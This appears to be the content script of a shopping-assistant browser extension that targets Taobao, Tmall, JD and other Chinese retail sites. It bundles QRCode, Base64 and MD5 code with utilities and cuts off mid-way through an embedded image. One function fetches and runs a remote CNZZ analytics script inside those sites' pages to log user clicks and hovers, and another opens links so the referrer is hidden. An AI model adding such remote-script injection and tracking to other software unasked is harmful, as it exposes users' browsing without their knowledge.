            /**
             * Clear the QRCode
             */
            Drawing.prototype.clear = function () {
                this._el.innerHTML = '';
            };
            return Drawing;
        })() : (function () { // Drawing in Canvas
            function _onMakeImage() {
                this._elImage.src = this._elCanvas.toDataURL("image/png");
                this._elImage.style.display = "block";
                this._elCanvas.style.display = "none";
            }

            // Android 2.1 bug workaround
            // http://code.google.com/p/android/issues/detail?id=5141
            if (this._android && this._android <= 2.1) {
                var factor = 1 / window.devicePixelRatio;
                var drawImage = CanvasRenderingContext2D.prototype.drawImage;
                CanvasRenderingContext2D.prototype.drawImage = function (image,sx,sy,sw,sh,dx,dy,dw,dh) {
                    if (("nodeName" in image) && /img/i.test(image.nodeName)) {
                        for (var i = arguments.length - 1; i >= 1; i--) {
                            arguments[i] = arguments[i] * factor;
                        }
                    } else if (typeof dw == "undefined") {
                        arguments[1] *= factor;
                        arguments[2] *= factor;
                        arguments[3] *= factor;
                        arguments[4] *= factor;
                    }
                    drawImage.apply(this,arguments);
                };
            }
            /**
             * Check whether the user's browser supports Data URI or not
             *
             * @private
             * @param {Function} fSuccess Occurs if it supports Data URI
             * @param {Function} fFail Occurs if it doesn't support Data URI
             */
            function _safeSetDataURI(fSuccess,fFail) {
                var self = this;
                self._fFail = fFail;
                self._fSuccess = fSuccess;
                // Check it just once
                if (self._bSupportDataURI === null) {
                    var el = document.createElement("img");
                    var fOnError = function () {
                        self._bSupportDataURI = false;
                        if (self._fFail) {
                            self._fFail.call(self);
                        }
                    };
                    var fOnSuccess = function () {
                        self._bSupportDataURI = true;
                        if (self._fSuccess) {
                            self._fSuccess.call(self);
                        }
                    };
                    el.onabort = fOnError;
                    el.onerror = fOnError;
                    el.onload = fOnSuccess;
                    el.src = "data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg=="; // the Image contains 1px data.
                    return;
                } else if (self._bSupportDataURI === true && self._fSuccess) {
                    self._fSuccess.call(self);
                } else if (self._bSupportDataURI === false && self._fFail) {
                    self._fFail.call(self);
                }
            };
            /**
             * Drawing QRCode by using canvas
             *
             * @constructor
             * @param {HTMLElement} el
             * @param {Object} htOption QRCode Options
             */
            var Drawing = function (el,htOption) {
                this._bIsPainted = false;
                this._android = _getAndroid();
                this._htOption = htOption;
                this._elCanvas = document.createElement("canvas");
                this._elCanvas.width = htOption.width;
                this._elCanvas.height = htOption.height;
                el.appendChild(this._elCanvas);
                this._el = el;
                this._oContext = this._elCanvas.getContext("2d");
                this._bIsPainted = false;
                this._elImage = document.createElement("img");
                this._elImage.alt = "Scan me!";
                this._elImage.style.display = "none";
                this._el.appendChild(this._elImage);
                this._bSupportDataURI = null;
            };
            /**
             * Draw the QRCode
             *
             * @param {QRCode} oQRCode
             */
            Drawing.prototype.draw = function (oQRCode) {
                var _elImage = this._elImage;
                var _oContext = this._oContext;
                var _htOption = this._htOption;
                var nCount = oQRCode.getModuleCount();
                var nWidth = _htOption.width / nCount;
                var nHeight = _htOption.height / nCount;
                var nRoundedWidth = Math.round(nWidth);
                var nRoundedHeight = Math.round(nHeight);
                _elImage.style.display = "none";
                this.clear();
                for (var row = 0; row < nCount; row++) {
                    for (var col = 0; col < nCount; col++) {
                        var bIsDark = oQRCode.isDark(row,col);
                        var nLeft = col * nWidth;
                        var nTop = row * nHeight;
                        _oContext.strokeStyle = bIsDark ? _htOption.colorDark : _htOption.colorLight;
                        _oContext.lineWidth = 1;
                        _oContext.fillStyle = bIsDark ? _htOption.colorDark : _htOption.colorLight;
                        _oContext.fillRect(nLeft,nTop,nWidth,nHeight);
                        // 안티 앨리어싱 방지 처리
                        _oContext.strokeRect(
                            Math.floor(nLeft) + 0.5,
                            Math.floor(nTop) + 0.5,
                            nRoundedWidth,
                            nRoundedHeight
                        );
                        _oContext.strokeRect(
                            Math.ceil(nLeft) - 0.5,
                            Math.ceil(nTop) - 0.5,
                            nRoundedWidth,
                            nRoundedHeight
                        );
                    }
                }
                this._bIsPainted = true;
            };
            /**
             * Make the image from Canvas if the browser supports Data URI.
             */
            Drawing.prototype.makeImage = function () {
                if (this._bIsPainted) {
                    _safeSetDataURI.call(this,_onMakeImage);
                }
            };
            /**
             * Return whether the QRCode is painted or not
             *
             * @return {Boolean}
             */
            Drawing.prototype.isPainted = function () {
                return this._bIsPainted;
            };
            /**
             * Clear the QRCode
             */
            Drawing.prototype.clear = function () {
                this._oContext.clearRect(0,0,this._elCanvas.width,this._elCanvas.height);
                this._bIsPainted = false;
            };
            /**
             * @private
             * @param {Number} nNumber
             */
            Drawing.prototype.round = function (nNumber) {
                if (!nNumber) {
                    return nNumber;
                }
                return Math.floor(nNumber * 1000) / 1000;
            };
            return Drawing;
        })();

        function _getTypeNumber(sText,nCorrectLevel) {
            var nType = 1;
            var length = _getUTF8Length(sText);
            for (var i = 0,len = QRCodeLimitLength.length; i <= len; i++) {
                var nLimit = 0;
                switch (nCorrectLevel) {
                    case QRErrorCorrectLevel.L :
                        nLimit = QRCodeLimitLength[i][0];
                        break;
                    case QRErrorCorrectLevel.M :
                        nLimit = QRCodeLimitLength[i][1];
                        break;
                    case QRErrorCorrectLevel.Q :
                        nLimit = QRCodeLimitLength[i][2];
                        break;
                    case QRErrorCorrectLevel.H :
                        nLimit = QRCodeLimitLength[i][3];
                        break;
                }
                if (length <= nLimit) {
                    break;
                } else {
                    nType++;
                }
            }
            if (nType > QRCodeLimitLength.length) {
                throw new Error("Too long data");
            }
            return nType;
        }

        function _getUTF8Length(sText) {
            var replacedText = encodeURI(sText).toString().replace(/\%[0-9a-fA-F]{2}/g,'a');
            return replacedText.length + (replacedText.length != sText ? 3 : 0);
        }

        QRCode = function (el,vOption) {
            this._htOption = {
                width:256,
                height:256,
                typeNumber:4,
                colorDark:"#000000",
                colorLight:"#ffffff",
                correctLevel:QRErrorCorrectLevel.H
            };
            if (typeof vOption === 'string') {
                vOption = {
                    text:vOption
                };
            }
            // Overwrites options
            if (vOption) {
                for (var i in vOption) {
                    this._htOption[i] = vOption[i];
                }
            }
            if (typeof el == "string") {
                el = document.getElementById(el);
            }
            if (this._htOption.useSVG) {
                Drawing = svgDrawer;
            }
            this._android = _getAndroid();
            this._el = el;
            this._oQRCode = null;
            this._oDrawing = new Drawing(this._el,this._htOption);
            if (this._htOption.text) {
                this.makeCode(this._htOption.text);
            }
        };
        QRCode.prototype.makeCode = function (sText) {
            this._oQRCode = new QRCodeModel(_getTypeNumber(sText,this._htOption.correctLevel),this._htOption.correctLevel);
            this._oQRCode.addData(sText);
            this._oQRCode.make();
            this._el.title = sText;
            this._oDrawing.draw(this._oQRCode);
            this.makeImage();
        };
        QRCode.prototype.makeImage = function () {
            if (typeof this._oDrawing.makeImage == "function" && (!this._android || this._android >= 3)) {
                this._oDrawing.makeImage();
            }
        };
        QRCode.prototype.clear = function () {
            this._oDrawing.clear();
        };
        QRCode.CorrectLevel = QRErrorCorrectLevel;
    })();
    (function (global,factory) {typeof exports === "object" && typeof module !== "undefined" ? module.exports = factory(global) : typeof define === "function" && define.amd ? define(factory) : factory(global)})(typeof self !== "undefined" ? self : typeof window !== "undefined" ? window : typeof global !== "undefined" ? global : this,function (global) {
        "use strict";
        var _Base64 = global.Base64;
        var version = "2.4.5";
        var buffer;
        if (typeof module !== "undefined" && module.exports) {try {buffer = require("buffer").Buffer} catch (err) {}}
        var b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        var b64tab = function (bin) {
            var t = {};
            for (var i = 0,l = bin.length; i < l; i++)t[bin.charAt(i)] = i;
            return t
        }(b64chars);
        var fromCharCode = String.fromCharCode;
        var cb_utob = function (c) {
            if (c.length < 2) {
                var cc = c.charCodeAt(0);
                return cc < 128 ? c : cc < 2048 ? fromCharCode(192 | cc >>> 6) + fromCharCode(128 | cc & 63) : fromCharCode(224 | cc >>> 12 & 15) + fromCharCode(128 | cc >>> 6 & 63) + fromCharCode(128 | cc & 63)
            } else {
                var cc = 65536 + (c.charCodeAt(0) - 55296) * 1024 + (c.charCodeAt(1) - 56320);
                return fromCharCode(240 | cc >>> 18 & 7) + fromCharCode(128 | cc >>> 12 & 63) + fromCharCode(128 | cc >>> 6 & 63) + fromCharCode(128 | cc & 63)
            }
        };
        var re_utob = /[\uD800-\uDBFF][\uDC00-\uDFFFF]|[^\x00-\x7F]/g;
        var utob = function (u) {return u.replace(re_utob,cb_utob)};
        var cb_encode = function (ccc) {
            var padlen = [0,2,1][ccc.length % 3],ord = ccc.charCodeAt(0) << 16 | (ccc.length > 1 ? ccc.charCodeAt(1) : 0) << 8 | (ccc.length > 2 ? ccc.charCodeAt(2) : 0),chars = [b64chars.charAt(ord >>> 18),b64chars.charAt(ord >>> 12 & 63),padlen >= 2 ? "=" : b64chars.charAt(ord >>> 6 & 63),padlen >= 1 ? "=" : b64chars.charAt(ord & 63)];
            return chars.join("")
        };
        var btoa = global.btoa ? function (b) {return global.btoa(b)} : function (b) {return b.replace(/[\s\S]{1,3}/g,cb_encode)};
        var _encode = buffer ? buffer.from && Uint8Array && buffer.from !== Uint8Array.from ? function (u) {return (u.constructor === buffer.constructor ? u : buffer.from(u)).toString("base64")} : function (u) {return (u.constructor === buffer.constructor ? u : new buffer(u)).toString("base64")} : function (u) {return btoa(utob(u))};
        var encode = function (u,urisafe) {return !urisafe ? _encode(String(u)) : _encode(String(u)).replace(/[+\/]/g,function (m0) {return m0 == "+" ? "-" : "_"}).replace(/=/g,"")};
        var encodeURI = function (u) {return encode(u,true)};
        var re_btou = new RegExp(["[À-ß][-¿]","[à-ï][-¿]{2}","[ð-÷][-¿]{3}"].join("|"),"g");
        var cb_btou = function (cccc) {
            switch (cccc.length) {
                case 4:
                    var cp = (7 & cccc.charCodeAt(0)) << 18 | (63 & cccc.charCodeAt(1)) << 12 | (63 & cccc.charCodeAt(2)) << 6 | 63 & cccc.charCodeAt(3),offset = cp - 65536;
                    return fromCharCode((offset >>> 10) + 55296) + fromCharCode((offset & 1023) + 56320);
                case 3:
                    return fromCharCode((15 & cccc.charCodeAt(0)) << 12 | (63 & cccc.charCodeAt(1)) << 6 | 63 & cccc.charCodeAt(2));
                default:
                    return fromCharCode((31 & cccc.charCodeAt(0)) << 6 | 63 & cccc.charCodeAt(1))
            }
        };
        var btou = function (b) {return b.replace(re_btou,cb_btou)};
        var cb_decode = function (cccc) {
            var len = cccc.length,padlen = len % 4,n = (len > 0 ? b64tab[cccc.charAt(0)] << 18 : 0) | (len > 1 ? b64tab[cccc.charAt(1)] << 12 : 0) | (len > 2 ? b64tab[cccc.charAt(2)] << 6 : 0) | (len > 3 ? b64tab[cccc.charAt(3)] : 0),chars = [fromCharCode(n >>> 16),fromCharCode(n >>> 8 & 255),fromCharCode(n & 255)];
            chars.length -= [0,0,2,1][padlen];
            return chars.join("")
        };
        var atob = global.atob ? function (a) {return global.atob(a)} : function (a) {return a.replace(/[\s\S]{1,4}/g,cb_decode)};
        var _decode = buffer ? buffer.from && Uint8Array && buffer.from !== Uint8Array.from ? function (a) {return (a.constructor === buffer.constructor ? a : buffer.from(a,"base64")).toString()} : function (a) {return (a.constructor === buffer.constructor ? a : new buffer(a,"base64")).toString()} : function (a) {return btou(atob(a))};
        var decode = function (a) {return _decode(String(a).replace(/[-_]/g,function (m0) {return m0 == "-" ? "+" : "/"}).replace(/[^A-Za-z0-9\+\/]/g,""))};
        var noConflict = function () {
            var Base64 = global.Base64;
            global.Base64 = _Base64;
            return Base64
        };
        global.Base64 = {VERSION:version,atob:atob,btoa:btoa,fromBase64:decode,toBase64:encode,utob:utob,encode:encode,encodeURI:encodeURI,btou:btou,decode:decode,noConflict:noConflict};
        if (typeof Object.defineProperty === "function") {
            var noEnum = function (v) {return {value:v,enumerable:false,writable:true,configurable:true}};
            global.Base64.extendString = function () {
                Object.defineProperty(String.prototype,"fromBase64",noEnum(function () {return decode(this)}));
                Object.defineProperty(String.prototype,"toBase64",noEnum(function (urisafe) {return encode(this,urisafe)}));
                Object.defineProperty(String.prototype,"toBase64URI",noEnum(function () {return encode(this,true)}))
            }
        }
        if (global["Meteor"]) {Base64 = global.Base64}
        if (typeof module !== "undefined" && module.exports) {module.exports.Base64 = global.Base64} else if (typeof define === "function" && define.amd) {define([],function () {return global.Base64})}
        return {Base64:global.Base64}
    });
    function cnzzAppend(callBack) {
        if (!$('html').html().match(`1264352198`)) {
            $("<script></script>").html(`var _czc = [];_czc.push(["_setAccount","1264352198"]);`).prependTo($("head"));
            $.getScript("https://s13.cnzz.com/z_stat.php?id=1264352198&web_id=1264352198",function () {
                $(document).on("click","[data-douyababapaopao]",function () {
                    var name = $(this).attr("data-douyababapaopao");
                    cnzzEvent(name,'点击');
                });
                var clock;
                $(document).on("mouseenter","[data-douyamovepaopao]",function () {
                    var that = $(this);
                    clock = setTimeout(function () {
                        var name = that.attr("data-douyamovepaopao");
                        cnzzEvent(name,'移入');
                    },500);
                });
                $(document).on("mouseleave","[data-douyamovepaopao]",function () {
                    clearInterval(clock);
                });
                if (callBack) {
                    callBack();
                }
            });
        } else {
            if (callBack) {
                callBack();
            }
        }
    }                  //CNZZ统计
    function cnzzEvent(n,e) {
        $("<script></script>").html(`var _czc = [];_czc.push(["_setAccount","1264352198"]);`).prependTo($("head"));
        var myScript = document.createElement("script");
        myScript.appendChild(document.createTextNode(`_czc.push(["_trackEvent","${n}","${e}"]);`));
        document.head.appendChild(myScript);
    }                //CNZZ统计
    function getUrlParam(name) {
        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
        var r = window.location.search.substr(1).match(reg);
        if (r != null) return decodeURI(r[2]);
        return null;
    }             // 当前地址取参
    function getParam(url,name) {
        url = url.split("?")[1];
        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
        var r = url.substr(0).match(reg);
        if (r != null) return r[2];
        return null;
    }           //指定url提参方法
    function unicodeToUtf8(data) {
        str = unescape(data.replace(/\\u/g,"%u"));
        return str;
    }           //unicode转中文方法
    function md5(t) {
        function e(t,e) {
            return t << e | t >>> 32 - e
        }

        function n(t,e) {
            var n,i,r,o,a;
            return r = 2147483648 & t, o = 2147483648 & e, n = 1073741824 & t, i = 1073741824 & e, a = (1073741823 & t) + (1073741823 & e), n & i ? 2147483648 ^ a ^ r ^ o : n | i ? 1073741824 & a ? 3221225472 ^ a ^ r ^ o : 1073741824 ^ a ^ r ^ o : a ^ r ^ o
        }

        function i(t,e,n) {
            return t & e | ~t & n
        }

        function r(t,e,n) {
            return t & n | e & ~n
        }

        function o(t,e,n) {
            return t ^ e ^ n
        }

        function a(t,e,n) {
            return e ^ (t | ~n)
        }

        function s(t,r,o,a,s,u,l) {
            return t = n(t,n(n(i(r,o,a),s),l)), n(e(t,u),r)
        }

        function u(t,i,o,a,s,u,l) {
            return t = n(t,n(n(r(i,o,a),s),l)), n(e(t,u),i)
        }

        function l(t,i,r,a,s,u,l) {
            return t = n(t,n(n(o(i,r,a),s),l)), n(e(t,u),i)
        }

        function c(t,i,r,o,s,u,l) {
            return t = n(t,n(n(a(i,r,o),s),l)), n(e(t,u),i)
        }

        function p(t) {
            var e,n,i = "",r = "";
            for (n = 0; 3 >= n; n++) e = t >>> 8 * n & 255, r = "0" + e.toString(16), i += r.substr(r.length - 2,2);
            return i
        }

        var f,d,h,g,m,v,y,b,k,x = [];
        for (t = function (t) {
            t = t.replace(/\r\n/g,"\n");
            for (var e = "",n = 0; n < t.length; n++) {
                var i = t.charCodeAt(n);
                128 > i ? e += String.fromCharCode(i) : i > 127 && 2048 > i ? (e += String.fromCharCode(i >> 6 | 192), e += String.fromCharCode(63 & i | 128)) : (e += String.fromCharCode(i >> 12 | 224), e += String.fromCharCode(i >> 6 & 63 | 128), e += String.fromCharCode(63 & i | 128))
            }
            return e
        }(t), x = function (t) {
            for (var e,n = t.length,i = n + 8,r = (i - i % 64) / 64,o = 16 * (r + 1),a = new Array(o - 1),s = 0,u = 0; n > u;) e = (u - u % 4) / 4, s = u % 4 * 8, a[e] = a[e] | t.charCodeAt(u) << s, u++;
            return e = (u - u % 4) / 4, s = u % 4 * 8, a[e] = a[e] | 128 << s, a[o - 2] = n << 3, a[o - 1] = n >>> 29, a
        }(t), v = 1732584193, y = 4023233417, b = 2562383102, k = 271733878, f = 0; f < x.length; f += 16) d = v, h = y, g = b, m = k, v = s(v,y,b,k,x[f + 0],7,3614090360), k = s(k,v,y,b,x[f + 1],12,3905402710), b = s(b,k,v,y,x[f + 2],17,606105819), y = s(y,b,k,v,x[f + 3],22,3250441966), v = s(v,y,b,k,x[f + 4],7,4118548399), k = s(k,v,y,b,x[f + 5],12,1200080426), b = s(b,k,v,y,x[f + 6],17,2821735955), y = s(y,b,k,v,x[f + 7],22,4249261313), v = s(v,y,b,k,x[f + 8],7,1770035416), k = s(k,v,y,b,x[f + 9],12,2336552879), b = s(b,k,v,y,x[f + 10],17,4294925233), y = s(y,b,k,v,x[f + 11],22,2304563134), v = s(v,y,b,k,x[f + 12],7,1804603682), k = s(k,v,y,b,x[f + 13],12,4254626195), b = s(b,k,v,y,x[f + 14],17,2792965006), y = s(y,b,k,v,x[f + 15],22,1236535329), v = u(v,y,b,k,x[f + 1],5,4129170786), k = u(k,v,y,b,x[f + 6],9,3225465664), b = u(b,k,v,y,x[f + 11],14,643717713), y = u(y,b,k,v,x[f + 0],20,3921069994), v = u(v,y,b,k,x[f + 5],5,3593408605), k = u(k,v,y,b,x[f + 10],9,38016083), b = u(b,k,v,y,x[f + 15],14,3634488961), y = u(y,b,k,v,x[f + 4],20,3889429448), v = u(v,y,b,k,x[f + 9],5,568446438), k = u(k,v,y,b,x[f + 14],9,3275163606), b = u(b,k,v,y,x[f + 3],14,4107603335), y = u(y,b,k,v,x[f + 8],20,1163531501), v = u(v,y,b,k,x[f + 13],5,2850285829), k = u(k,v,y,b,x[f + 2],9,4243563512), b = u(b,k,v,y,x[f + 7],14,1735328473), y = u(y,b,k,v,x[f + 12],20,2368359562), v = l(v,y,b,k,x[f + 5],4,4294588738), k = l(k,v,y,b,x[f + 8],11,2272392833), b = l(b,k,v,y,x[f + 11],16,1839030562), y = l(y,b,k,v,x[f + 14],23,4259657740), v = l(v,y,b,k,x[f + 1],4,2763975236), k = l(k,v,y,b,x[f + 4],11,1272893353), b = l(b,k,v,y,x[f + 7],16,4139469664), y = l(y,b,k,v,x[f + 10],23,3200236656), v = l(v,y,b,k,x[f + 13],4,681279174), k = l(k,v,y,b,x[f + 0],11,3936430074), b = l(b,k,v,y,x[f + 3],16,3572445317), y = l(y,b,k,v,x[f + 6],23,76029189), v = l(v,y,b,k,x[f + 9],4,3654602809), k = l(k,v,y,b,x[f + 12],11,3873151461), b = l(b,k,v,y,x[f + 15],16,530742520), y = l(y,b,k,v,x[f + 2],23,3299628645), v = c(v,y,b,k,x[f + 0],6,4096336452), k = c(k,v,y,b,x[f + 7],10,1126891415), b = c(b,k,v,y,x[f + 14],15,2878612391), y = c(y,b,k,v,x[f + 5],21,4237533241), v = c(v,y,b,k,x[f + 12],6,1700485571), k = c(k,v,y,b,x[f + 3],10,2399980690), b = c(b,k,v,y,x[f + 10],15,4293915773), y = c(y,b,k,v,x[f + 1],21,2240044497), v = c(v,y,b,k,x[f + 8],6,1873313359), k = c(k,v,y,b,x[f + 15],10,4264355552), b = c(b,k,v,y,x[f + 6],15,2734768916), y = c(y,b,k,v,x[f + 13],21,1309151649), v = c(v,y,b,k,x[f + 4],6,4149444226), k = c(k,v,y,b,x[f + 11],10,3174756917), b = c(b,k,v,y,x[f + 2],15,718787259), y = c(y,b,k,v,x[f + 9],21,3951481745), v = n(v,d), y = n(y,h), b = n(b,g), k = n(k,m);
        return (p(v) + p(y) + p(b) + p(k)).toLowerCase()
    }                        // md5
    function trim(str) {
        return str.replace(/^(\s|\u00A0)+/,'').replace(/(\s|\u00A0)+$/,'');
    }                     // 去掉字符串前后空格
    function numSub(a,b) {
        var c,d,e;    //
        function mul(a,b) {
            var c = 0,
                d = a.toString(),
                e = b.toString();
            try {
                c += d.split(".")[1].length;
            } catch (f) {
            }
            try {
                c += e.split(".")[1].length;
            } catch (f) {
            }
            return Number(d.replace(".","")) * Number(e.replace(".","")) / Math.pow(10,c);
        }   //
        try {
            c = a.toString().split(".")[1].length;
        } catch (f) {
            c = 0;
        }
        try {
            d = b.toString().split(".")[1].length;
        } catch (f) {
            d = 0;
        }
        e = Math.pow(10,Math.max(c,d));
        return (mul(a,e) - mul(b,e)) / e;
    }                  //去掉浮点数的相减方法
    function openWindow(full_link) {
        window.open('javascript:window.name;','<script>location.replace("' + full_link + '")<\/script>');
    }   //不带refer跳转
    var locHost = location.host;
    //详情页
    !function () {
        var adaptationArr = {
            'detail.tmall.com':{'name':"tm",'dom':['#J_TabBarBox','#side-shop-info .hd','.tm-floatcart-link','#mainwrap .tabbar-bg']},
            'detail.tmall.hk':{'name':"tm",'dom':['#J_TabBarBox','#side-shop-info .hd','.tm-floatcart-link','#mainwrap .tabbar-bg']},
            'item.taobao.com':{'name':"tb",'dom':['#J_TabBarWrap']},
            'item.taobao.hk':{'name':"tb",'dom':['#J_TabBarWrap']},
            'detail.ju.taobao.com':{'name':"ju",'dom':['.dd-header']},
            'chaoshi.detail.tmall.com':{'name':"tm",'dom':['#page .tm-chaoshi-nav']},
            'item.jd.com':{'name':"jd",'dom':['#detail .tab-main']},
            'item.jd.hk':{'name':"jd",'dom':['#detail .tab-main']},
            'product.suning.com':{'name':"sn",'dom':['.fixbar','.d-an-list']},
            'item.gome.com.cn':{'name':"gm",'dom':['#fixtabox']},
            'product.dangdang.com':{'name':"dd",'dom':['#tab-panels']}
        };
        var adaptationOk = 0;
        var nowPlat = "";
        $.each(adaptationArr,function (v,k) {
            if (locHost == v) {
                adaptationOk = 1;
                nowPlat = k.name;
                return false;
            }
        });
        if (adaptationOk) {
            // var cssStyle = '';
            var cssStyle = '.dypTop9527-box,.dypTop9527-mini{position:fixed;top:0;z-index:2147483647;transition:all .5s}.dypTop9527-sameStyleDrop-title,.dypTop9527-vipCouponDrop-title{text-indent:18px;-webkit-line-clamp:2;-webkit-box-orient:vertical}#dypAbs9527,.dypTop9527-box,.dypTop9527-search input{font-family:Arial,"Microsoft Yahei",serif}#dyp779946-fix-full .clearfix,#dypAbs9527 .dypClear,#dypMid9527 .dypClear,#dypTop9527 .dypClear{zoom:1}#dyp779946-fix-full .model-param,.dypMid9527-cit-right-params,.dypTop9527-font_inner a,.dypTop9527-sameStyle-price{white-space:nowrap;text-overflow:ellipsis}#dypAbs9527 b,#dypMid9527 b,#dypTop9527 b{display:inline-block}#dypAbs9527 button,#dypAbs9527 input,#dypMid9527 button,#dypMid9527 input,#dypTop9527 button,#dypTop9527 input{outline:0}#dypAbs9527 a,#dypMid9527 a,#dypTop9527 a{text-decoration:none}#dypAbs9527 li,#dypAbs9527 ul,#dypMid9527 li,#dypMid9527 ul,#dypTop9527 li,#dypTop9527 ul{margin:0;padding:0;list-style:none}#dypAbs9527 .fl,#dypMid9527 .fl,#dypTop9527 .fl{float:left}#dypAbs9527 .fr,#dypMid9527 .fr,#dypTop9527 .fr{float:right}#dypAbs9527 .dypClear:after,#dypMid9527 .dypClear:after,#dypTop9527 .dypClear:after{visibility:hidden;clear:both;display:block;content:"";height:0}#dypAbs9527 .dypClear:before,#dypMid9527 .dypClear:before,#dypTop9527 .dypClear:before{content:" ";display:table}.dypTop9527-box{left:0;min-width:1200px;font-size:12px;width:100%;border-bottom:1px solid #D5D5D5;background-color:#FFF;color:#545454}.dypTop9527-box>div{height:40px;line-height:40px}.dypTop9527-box>div:hover .dypTop9527-topMask{border-color:#FD2550}.dypTop9527-box>div:hover .dypTop9527-rMask{display:none}.dypTop9527-mini{right:0;height:32px;box-shadow:-2px 2px 4px 0 rgba(0,0,0,.2);border-radius:5px 0 0 5px;background:url(data:image/gif;base64,R0lGODlhKgAgAPf/APze5PeQpv3r7/m2xfvQ2vVXePQnUPVYefrAzPvW3vvO2PeHnfZ2kfm6yPmzwvq9yvifsvrDz/Z3kvigsveKoveSqP3o7f3k6veVqvvK1Piqu/Z1kPaAmf719/eNpPmrvPVVd/VnhfVkgszMzPZriPZqh/mvv/ZsifQhTP3u8vZph/Vlg/VohvVPcfZtifVmhPVigfzi6PVOcPZtitfX1+rq6t/f387OzvRAZfeMo/QgSvrF0P74+vQfSvZ0j/VFafRCZvVSc/Q/ZPQ7YfidsPeWq/VffvQ+Y/Z0kP75+vQiTPVhgPVae/QxWfVTdfQpUvVHavQhS/rI0/rG0fVFaPVUdvQrVPmuvvm5x/74+fmwv/VdffeKoPQqU/QsVPmtvfVEaPZ6lPZ8lveJofibr/ZvjNnZ2fRBZv7y9fijtf/9/vm4xvQ4X/Q2XPzZ4PZ5k/rJ1PVMbvrH0vipuv3t8PvN1/rG0vVZefeXrPihtP7w8/Q3X//8/fZ7lfVJbPeYrfQuVv3u8fVbe/Vgf/RDZ/QvV/QwWPQ0W/VWd/QjTfVefvQoUfVZevVQcfVRcvVcfPVIa/Q1W/VGavVggP709vQ6YfQtVfQzWvQwV/Q3Xf72+P7z9vePpfm0w/QkTvVNb/ilt/eFnPVKbfVMb/Q5YPVLbfQyWfVlhP73+PeIn/mxwfeSp/73+fmywfZui/Z/mPZ9lvZwjP/+/vrF0fiesfQ9YvzZ4fZ9l/7v8v/6+/eOpPZzjv/7/PeUqfZ5lPrE0Pq8yfVkg/icsPZvi/iitfeEnPZ+mPm1w/za4f729/q/y/VohfaBmvinuPZ4k/Zzj/ZqiPzc4/rBzfmxwPeLovm1xPioufidsf7y9PeWqv3s8PiZrfeEm/mwwPiktvZ+l/7z9fm3xfvT3Pzb4vZuivZyjfVbfPq/zPm4x/7x9Pimt/eGnP/9/fZ6k/eHnvZphveNovVPcPZxjPVaevzX3/aDm/m6x/VjgfQ9Y/iitPijtvVjgv///+7u7vQeSQAAACH/C05FVFNDQVBFMi4wAwEAAAAh/wtYTVAgRGF0YVhNUDw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQwIDc5LjE2MDQ1MSwgMjAxNy8wNS8wNi0wMTowODoyMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDpiMTE2NWI3NS1hOTFmLTQ0Y2YtODJkOC1lN2YxZjRhNTQ4ZGUiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MEM4MjYzMjBCN0EzMTFFN0E4MENBNzNDNDEyRUU5RUUiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MEM4MjYzMUZCN0EzMTFFN0E4MENBNzNDNDEyRUU5RUUiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6YjExNjViNzUtYTkxZi00NGNmLTgyZDgtZTdmMWY0YTU0OGRlIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOmIxMTY1Yjc1LWE5MWYtNDRjZi04MmQ4LWU3ZjFmNGE1NDhkZSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPS0dDPzs3My8rJyMfGxcTDwsHAv769vLu6ubi3trW0s7KxsK+urayrqqmop6alpKOioaCfnp2cm5qZmJeWlZSTkpGQj46NjIuKiYiHhoWEg4KBgH9+fXx7enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmFgX15dXFtaWVhXVlVUU1JRUE9OTUxLSklIR0ZFRENCQUA/Pj08Ozo5ODc2NTQzMjEwLy4tLCsqKSgnJiUkIyIhIB8eHRwbGhkYFxYVFBMSERAPDg0MCwoJCAcGBQQDAgEAACH5BAUDAP8ALAAAAAAqACAAAAj/AP0JHEiwoMGDBPspXMgQocOHBRlK7AexosOJDS1qTIhR4caP/jp6JIiDn8mTKFOm9BFRZMEhMZJ0mEmzps0OWQLBaNkR5EaRFAkyIJPDg9GjSJN6yFGEC0+MBVVKncrPC8eeA4NQ3XpSzFWoA8Nx5Rrj68SBTcaODTEQ6MA8arlOaetSoJ64W1PQ7UdjhF8aI/2lSdkHAModc1KGUYOyzt4aN0bcqBEYBZyTWPz54GOSjhB/bk4S8YfnZAwqe/vZGGFjYUEgMn4MZIOkzJOBMJBAGXhGBhgdZs1kHIhjiU8jTJ6eJWiHX4GPSkwql1jQBL8WH1Hw02uWOkHr2DdqXOeeevlA8Nm3Tx8uEL149d3Z+9PC